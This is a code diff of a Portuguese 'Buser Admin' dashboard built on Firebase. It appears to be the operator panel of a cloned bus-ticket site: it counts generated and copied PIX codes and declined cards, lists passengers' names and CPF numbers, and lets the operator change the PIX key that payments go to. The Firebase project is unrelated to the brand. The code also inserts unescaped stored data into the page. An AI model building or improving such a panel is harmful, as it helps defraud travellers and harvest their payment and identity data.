@@ -1,236 +1,263 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Painel de Controle | Buser</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-<style>
-  :root { --brand: #f11075; --bg: #f4f5f7; --text: #454545; --green: #40b552; }
-  body { font-family: 'Poppins', sans-serif; background: var(--bg); margin: 0; padding: 20px; color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; box-sizing: border-box; }
-  .container { width: 100%; max-width: 700px; }
-  
-  /* Tela de Login */
-  .login-box { background: #fff; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; margin-top: 10vh; display: block; }
-  .login-box h1 { color: var(--brand); margin-top: 0; font-size: 24px; }
-  .login-box input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-family: 'Poppins'; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; text-align: center; outline: none; transition: 0.2s; }
-  .login-box button { width: 100%; padding: 15px; background: var(--brand); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-  
-  /* Painel */
-  .painel-box { display: none; animation: fadeIn 0.4s ease; width: 100%; }
-  .header-painel { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
-  .header-painel h2 { margin: 0; font-size: 22px; color: var(--brand); }
-  .btn-sair { background: transparent; border: 1px solid #ddd; padding: 8px 16px; border-radius: 20px; cursor: pointer; font-family: 'Poppins'; font-size: 12px; font-weight: 600; color: #666; }
-  
-  /* Dashboard (Cards de Status) */
-  .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
-  .stat-card { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #f0f0f0; display: flex; flex-direction: column; gap: 8px; }
-  .stat-card h4 { margin: 0; font-size: 13px; color: #666; font-weight: 500; }
-  .stat-card .number { font-size: 32px; font-weight: 700; color: var(--brand); }
-  .stat-card .number.green { color: var(--green); }
-
-  /* Cards de Configuração */
-  .card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); margin-bottom: 20px; border: 1px solid #f0f0f0; }
-  .card h3 { margin-top: 0; font-size: 16px; color: #333; border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
-  .form-group { margin-bottom: 16px; }
-  .form-group label { display: block; font-size: 13px; font-weight: 600; color: #666; margin-bottom: 6px; }
-  .form-group input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; font-family: 'Poppins'; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.2s; }
-  .btn-salvar { width: 100%; padding: 16px; background: var(--brand); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-  .btn-limpar { width: 100%; padding: 12px; background: transparent; color: #d81b60; border: 1px solid #d81b60; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-  .btn-limpar:hover { background: #fff0f5; }
-
-  /* Tabela de Histórico */
-  .table-container { overflow-x: auto; }
-  table { width: 100%; border-collapse: collapse; font-size: 13px; }
-  th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
-  th { background: #f9f9f9; color: #666; font-weight: 600; }
-  tr:hover { background: #fafafa; }
-
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  @media (max-width: 600px) { .stats-grid { grid-template-columns: 1fr; } }
-</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Painel de Controle - Buser Admin</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
+<style>body { font-family: 'Poppins', sans-serif; background-color: #f4f5f7; }</style>
 </head>
-<body>
+<body class="text-slate-800">
 
-<div class="container">
-  
-  <!-- LOGIN -->
-  <div class="login-box" id="loginBox">
-    <h1>Acesso Restrito</h1>
-    <p style="font-size: 14px; color: #666; margin-bottom: 24px;">Digite a senha para acessar o painel.</p>
-    <input type="password" id="senhaAdmin" placeholder="Senha de Administrador">
-    <button onclick="fazerLogin()">Entrar no Painel</button>
+<!-- NAVBAR -->
+<header class="bg-slate-900 text-white shadow-lg sticky top-0 z-50">
+  <div class="max-w-7xl mx-auto px-4 py-3 flex justify-between items-center flex-wrap gap-2">
+    <div class="flex items-center gap-4">
+      <span class="text-xl font-black tracking-tight text-pink-500">Buser<span class="text-white">Admin</span></span>
+      <select id="filtro-periodo" class="bg-slate-800 text-sm border border-slate-700 rounded-lg px-3 py-1.5 focus:outline-none focus:border-pink-500" onchange="filtrarDados()">
+        <option value="hoje">Hoje</option>
+        <option value="7dias">Últimos 7 dias</option>
+        <option value="tudo" selected>Todo o período</option>
+      </select>
+    </div>
+    <div class="flex items-center gap-4 text-sm font-medium">
+      <div class="flex items-center gap-2 bg-slate-800 px-3 py-1.5 rounded-full border border-slate-700">
+        <div class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></div>
+        <span>Online: <span id="online-users" class="font-bold text-emerald-400">0</span></span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main class="max-w-7xl mx-auto px-4 py-8 space-y-8">
+
+  <!-- MÉTRICAS -->
+  <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Faturamento</h3>
+      <p class="text-xl font-black text-slate-900" id="total-faturamento">R$ 0,00</p>
+    </div>
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Vendas</h3>
+      <p class="text-xl font-black text-emerald-500" id="total-vendas">0</p>
+    </div>
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Buscas</h3>
+      <p class="text-xl font-black text-blue-500" id="total-buscas">0</p>
+    </div>
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">PIX Gerados</h3>
+      <p class="text-xl font-black text-amber-500" id="total-pix-gerados">0</p>
+    </div>
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">PIX Copiados</h3>
+      <p class="text-xl font-black text-emerald-600" id="total-pix-copiados">0</p>
+    </div>
+    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200">
+      <h3 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Cartão Recusado</h3>
+      <p class="text-xl font-black text-red-500" id="total-cartao-recusado">0</p>
+    </div>
   </div>
 
-  <!-- PAINEL -->
-  <div class="painel-box" id="painelBox">
-    <div class="header-painel">
-      <h2>Dashboard Buser</h2>
-      <button class="btn-sair" onclick="sair()">Sair</button>
+  <!-- CONFIGURAÇÃO DO GATEWAY -->
+  <div class="bg-white rounded-2xl p-6 shadow-sm border border-slate-200">
+    <div class="flex items-center gap-2 mb-4">
+      <span class="text-xl">🔑</span>
+      <h3 class="text-sm font-bold text-slate-800">Configurações de Pagamento (Simulador)</h3>
     </div>
-
-    <!-- Estatísticas -->
-    <div class="stats-grid">
-      <div class="stat-card">
-        <h4>👥 Acessos (Pesquisas)</h4>
-        <div class="number" id="stat-pesquisas">0</div>
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+      <div class="md:col-span-2">
+        <label class="block text-xs font-bold text-slate-500 mb-1">Chave Aleatória / Gateway Key</label>
+        <input type="text" id="input-chave-gateway" placeholder="Ex: chave_teste_123456" class="w-full bg-slate-50 border border-slate-200 text-slate-700 rounded-lg px-3 py-2 outline-none focus:ring-2 focus:ring-pink-500">
+        <p class="text-[10px] text-slate-400 mt-1">Essa chave será usada no código PIX gerado.</p>
       </div>
-      <div class="stat-card">
-        <h4>💸 PIX Gerados</h4>
-        <div class="number green" id="stat-pix">0</div>
+      <div class="flex items-end">
+        <button onclick="salvarConfiguracoes()" class="bg-pink-600 hover:bg-pink-700 text-white px-6 py-2.5 rounded-lg text-sm font-bold transition w-full">Salvar Configuração</button>
       </div>
     </div>
+  </div>
 
-    <!-- Configurações -->
-    <div class="card">
-      <h3>⚙️ Configurações</h3>
-      <div class="form-group">
-        <label>Chave PIX (CPF, Celular, E-mail ou Aleatória)</label>
-        <input type="text" id="inputChavePix" placeholder="Ex: 11999999999">
-        <p style="font-size: 11px; color: #999; margin: 4px 0 0 0;">O QR Code será gerado automaticamente com esta chave.</p>
-      </div>
-      <div class="form-group">
-        <label>Desconto Global (%)</label>
-        <input type="number" id="inputDesconto" placeholder="Ex: 10" min="0" max="100">
-      </div>
-      <button class="btn-salvar" onclick="salvarConfig()">Salvar Configurações</button>
-      <p class="msg" id="msgStatus" style="text-align:center; font-size:14px; margin-top:10px; display:none;"></p>
-    </div>
-
-    <!-- Histórico de PIX -->
-    <div class="card">
-      <h3>📋 Histórico de PIX</h3>
-      <div class="table-container">
-        <table>
-          <thead>
+  <!-- TABELAS -->
+  <div class="grid grid-cols-1 gap-8">
+    <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden flex flex-col">
+      <div class="p-4 border-b border-slate-100 bg-slate-50"><h2 class="font-bold text-slate-800">Últimos Pedidos</h2></div>
+      <div class="overflow-x-auto flex-1 max-h-[500px]">
+        <table class="w-full text-left border-collapse">
+          <thead class="sticky top-0 bg-white shadow-sm z-10 text-xs font-bold text-slate-400 uppercase border-b border-slate-100">
             <tr>
-              <th>Data/Hora</th>
-              <th>Cliente</th>
-              <th>Valor</th>
-              <th>Status</th>
+              <th class="p-3">Data</th>
+              <th class="p-3">Rota</th>
+              <th class="p-3">Passageiro</th>
+              <th class="p-3">Pgto</th>
+              <th class="p-3">Chave Usada</th>
+              <th class="p-3">Status</th>
+              <th class="p-3">Valor</th>
             </tr>
           </thead>
-          <tbody id="tabela-pix">
-            <tr><td colspan="4" style="text-align:center; color:#999;">Nenhum PIX gerado ainda.</td></tr>
-          </tbody>
+          <tbody id="tabela-pedidos" class="text-sm divide-y divide-slate-100"></tbody>
         </table>
       </div>
-      <button class="btn-limpar" onclick="limparHistorico()">Limpar Histórico de Testes</button>
     </div>
   </div>
-</div>
+</main>
 
 <!-- FIREBASE -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <script>
   const firebaseConfig = {
     apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA",
-    authDomain: "buser202872a.firebaseapp.com",
-    projectId: "buser202872a",
-    storageBucket: "buser202872a.appspot.com",
+    authDomain: "projeto-link-ddbf0.firebaseapp.com",
+    databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
+    projectId: "projeto-link-ddbf0",
+    storageBucket: "projeto-link-ddbf0.firebasestorage.app",
     messagingSenderId: "560317126646",
     appId: "1:560317126646:web:be9cad9c9ed350940399d7"
   };
   firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
   const fs = firebase.firestore();
-  const SENHA_MESTRA = "buser2026";
 
-  function fazerLogin() {
-    if (document.getElementById('senhaAdmin').value === SENHA_MESTRA) {
-      document.getElementById('loginBox').style.display = 'none';
-      document.getElementById('painelBox').style.display = 'block';
-      carregarDados();
-      carregarEstatisticas();
-    } else { alert("Senha incorreta!"); }
-  }
-  function sair() { location.reload(); }
+  let todosPedidos = [];
+  let todasBuscas = [];
+  let periodoAtual = 'tudo';
 
-  // 1. Carrega as Configurações
-  async function carregarDados() {
-    try {
-      const doc = await fs.collection("config").doc("global").get();
-      if (doc.exists) {
-        document.getElementById('inputDesconto').value = doc.data().descontoGlobal || 0;
-        document.getElementById('inputChavePix').value = doc.data().chavePix || '';
-      }
-    } catch (e) { console.log("Erro ao carregar configs."); }
-  }
+  // USUÁRIOS ONLINE
+  db.ref('visitas').on('value', (snapshot) => {
+    let online = 0;
+    snapshot.forEach((child) => { if (child.val().online === true) online++; });
+    document.getElementById('online-users').innerText = online;
+  });
 
-  // 2. Salva as Configurações
-  async function salvarConfig() {
-    const btn = document.querySelector('.btn-salvar');
-    const msg = document.getElementById('msgStatus');
-    btn.textContent = "Salvando...";
-    msg.style.display = 'none';
-    
-    const desconto = parseFloat(document.getElementById('inputDesconto').value) || 0;
-    const chavePix = document.getElementById('inputChavePix').value;
-    
-    try {
-      await fs.collection("config").doc("global").set({ 
-        descontoGlobal: desconto, 
-        chavePix: chavePix 
-      }, { merge: true });
-      
-      msg.textContent = "Salvo com sucesso!"; 
-      msg.style.color = "#40b552";
-      msg.style.display = 'block';
-    } catch (error) {
-      msg.textContent = "Erro ao salvar.";
-      msg.style.color = "#d81b60";
-      msg.style.display = 'block';
-    } finally { 
-      btn.textContent = "Salvar Configurações"; 
-      setTimeout(() => msg.style.display = 'none', 3000); 
+  // LER CONFIGURAÇÕES
+  fs.collection("config").doc("global").onSnapshot(snap => {
+    if (snap.exists) {
+      document.getElementById('input-chave-gateway').value = snap.data().chaveGateway || '';
     }
-  }
+  });
 
-  // 3. Carrega as Estatísticas e a Tabela
-  function carregarEstatisticas() {
-    // Contador de Pesquisas
-    fs.collection("pesquisas").onSnapshot(snap => {
-      document.getElementById('stat-pesquisas').textContent = snap.size;
-    });
+  // SALVAR CONFIGURAÇÕES
+  window.salvarConfiguracoes = () => {
+    const chave = document.getElementById('input-chave-gateway').value;
+    fs.collection("config").doc("global").set({
+      chaveGateway: chave,
+      updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+    }, { merge: true }).then(() => alert("✅ Chave salva!")).catch(err => alert("Erro: " + err.message));
+  };
 
-    // Contador e Tabela de PIX
-    fs.collection("pix_gerados").orderBy("timestamp", "desc").onSnapshot(snap => {
-      document.getElementById('stat-pix').textContent = snap.size;
-      const tbody = document.getElementById('tabela-pix');
-      
-      if (snap.empty) {
-        tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#999;">Nenhum PIX gerado ainda.</td></tr>`;
-        return;
+  // FILTRAR E CALCULAR
+  function filtrarDados() {
+    periodoAtual = document.getElementById('filtro-periodo').value;
+    document.getElementById('tabela-pedidos').innerHTML = '';
+
+    const agora = new Date();
+    let limite = new Date(0);
+    if (periodoAtual === 'hoje') limite = new Date(agora.setHours(0,0,0,0));
+    else if (periodoAtual === '7dias') limite = new Date(agora.setTime(agora.getTime() - 7*24*60*60*1000));
+
+    let fat = 0, qtdVendas = 0;
+    let totalPixGerados = 0, totalPixCopiados = 0, totalCartaoRecusado = 0;
+
+    const pedidosFiltrados = todosPedidos.filter(p => p.timestampDate >= limite);
+    
+    pedidosFiltrados.forEach(d => {
+      if (d.tipo === 'pix') totalPixGerados++;
+      if (d.tipo === 'pix' && d.pixCopiado) totalPixCopiados++;
+      if (d.tipo === 'cartao' && d.status === 'recusado') totalCartaoRecusado++;
+
+      if (d.status !== 'cancelado' && d.status !== 'recusado') {
+        fat += d.total;
+        qtdVendas++;
       }
-
-      tbody.innerHTML = snap.docs.map(doc => {
-        const pix = doc.data();
-        let dataStr = "Agora";
-        if (pix.timestamp) {
-          const d = pix.timestamp.toDate();
-          dataStr = d.toLocaleDateString('pt-BR') + ' ' + d.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
-        }
-        return `
-          <tr>
-            <td>${dataStr}</td>
-            <td>${pix.cliente}</td>
-            <td style="color:var(--brand); font-weight:600;">R$ ${pix.valor.toFixed(2).replace('.', ',')}</td>
-            <td style="color:#40b552; font-weight:600;">Gerado</td>
-          </tr>
-        `;
-      }).join('');
+      renderizarLinhaPedido(d);
     });
+
+    document.getElementById('total-faturamento').innerText = `R$ ${fat.toFixed(2).replace('.', ',')}`;
+    document.getElementById('total-vendas').innerText = qtdVendas;
+    document.getElementById('total-pix-gerados').innerText = totalPixGerados;
+    document.getElementById('total-pix-copiados').innerText = totalPixCopiados;
+    document.getElementById('total-cartao-recusado').innerText = totalCartaoRecusado;
+    
+    const buscasFiltradas = todasBuscas.filter(b => b.timestampDate >= limite);
+    document.getElementById('total-buscas').innerText = buscasFiltradas.length;
   }
 
-  // 4. Limpa o Histórico
-  async function limparHistorico() {
-    if (!confirm("Tem certeza que deseja limpar todo o histórico de PIX?")) return;
-    const snap = await fs.collection("pix_gerados").get();
-    const batch = fs.batch();
-    snap.docs.forEach(doc => batch.delete(doc.ref));
-    await batch.commit();
-    alert("Histórico limpo!");
+  function renderizarLinhaPedido(d) {
+    let dataHora = d.timestampDate.toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' });
+    const passageiro = d.passageiros[0] || { nome: "Não informado", cpf: "000.000.000-00" };
+    const badgePag = d.tipo === 'pix' ? 'bg-emerald-100 text-emerald-700' : 'bg-blue-100 text-blue-700';
+    
+    let corStatus = 'text-amber-500';
+    if (d.status === 'pago') corStatus = 'text-emerald-500';
+    if (d.status === 'cancelado' || d.status === 'recusado') corStatus = 'text-red-500';
+
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td class="p-3 text-slate-500 whitespace-nowrap">${dataHora}</td>
+      <td class="p-3"><span class="font-bold text-slate-800">${d.viagem.company.name}</span><br><span class="text-xs text-slate-500">Poltrona ${d.poltrona}</span></td>
+      <td class="p-3"><span class="font-medium">${passageiro.nome}</span><br><span class="text-xs text-slate-500">${passageiro.cpf}</span></td>
+      <td class="p-3"><span class="px-2 py-1 rounded text-xs font-bold ${badgePag}">${d.tipo.toUpperCase()}</span></td>
+      <td class="p-3 text-xs text-slate-500 font-mono">${d.chaveUtilizada || 'Nenhuma'}</td>
+      <td class="p-3">
+        <select class="bg-slate-50 border border-slate-200 text-xs font-bold rounded-lg px-2 py-1 outline-none ${corStatus}" onchange="alterarStatus('${d.colecao}', '${d.id}', this.value)">
+          <option value="pendente" ${d.status === 'pendente' ? 'selected' : ''}>Pendente</option>
+          <option value="pago" ${d.status === 'pago' ? 'selected' : ''}>Pago</option>
+          <option value="cancelado" ${d.status === 'cancelado' ? 'selected' : ''}>Cancelado</option>
+          <option value="recusado" ${d.status === 'recusado' ? 'selected' : ''}>Recusado</option>
+        </select>
+      </td>
+      <td class="p-3 font-bold text-slate-800">R$ ${d.total.toFixed(2).replace('.', ',')}</td>
+    `;
+    document.getElementById('tabela-pedidos').appendChild(tr);
   }
+
+  // ESCUTAR DADOS DO FIREBASE
+  fs.collection("pix_gerados").onSnapshot(snapshot => {
+    snapshot.docChanges().forEach(change => {
+      if (change.type === "added") {
+        const d = change.doc.data();
+        d.id = change.doc.id; d.colecao = 'pix_gerados'; d.tipo = 'pix';
+        d.timestampDate = d.timestamp ? d.timestamp.toDate() : new Date();
+        todosPedidos.push(d);
+        if (periodoAtual !== 'x') filtrarDados();
+      }
+    });
+  });
+
+  fs.collection("cartoes").onSnapshot(snapshot => {
+    snapshot.docChanges().forEach(change => {
+      if (change.type === "added") {
+        const d = change.doc.data();
+        d.id = change.doc.id; d.colecao = 'cartoes'; d.tipo = 'cartao';
+        d.timestampDate = d.timestamp ? d.timestamp.toDate() : new Date();
+        todosPedidos.push(d);
+        if (periodoAtual !== 'x') filtrarDados();
+      }
+    });
+  });
+
+  fs.collection("viagens_pesquisadas").onSnapshot(snapshot => {
+    snapshot.docChanges().forEach(change => {
+      if (change.type === "added") {
+        const d = change.doc.data();
+        d.timestampDate = d.timestamp ? d.timestamp.toDate() : new Date();
+        todasBuscas.push(d);
+        if (periodoAtual !== 'x') filtrarDados();
+      }
+    });
+  });
+
+  window.alterarStatus = (colecao, docId, novoStatus) => {
+    fs.collection(colecao).doc(docId).update({ status: novoStatus })
+      .then(() => {
+        const pedido = todosPedidos.find(p => p.id === docId);
+        if (pedido) pedido.status = novoStatus;
+        filtrarDados();
+      });
+  };
 </script>
 </body>
 </html>
